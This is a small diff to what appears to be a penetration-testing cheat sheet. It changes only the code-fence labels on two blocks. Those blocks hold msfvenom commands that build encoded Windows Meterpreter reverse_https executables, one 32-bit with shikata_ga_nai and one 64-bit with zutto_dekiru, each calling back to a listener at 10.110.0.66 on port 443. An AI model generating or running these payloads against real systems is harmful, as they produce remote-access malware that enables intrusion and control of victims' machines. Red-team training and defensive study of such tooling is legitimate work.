@@ -68,13 +68,13 @@ msfvenom --list encoders
 
 ### 32 bits x86/shikata\_ga\_nai
 
-```text
+```csharp
 msfvenom -p  windows/meterpreter/reverse_https  LHOST=10.110.0.66 LPORT=443 -e x86/shikata_ga_nai -f exe -o msf32.exe
 ```
 
 ### 64 bits x64/zutto\_dekiru
 
-```text
+```csharp
  msfvenom -p  windows/x64/meterpreter/reverse_https  LHOST=10.110.0.66 LPORT=443 -e x64/zutto_dekiru  -f exe -o msf64.exe
 ```
 
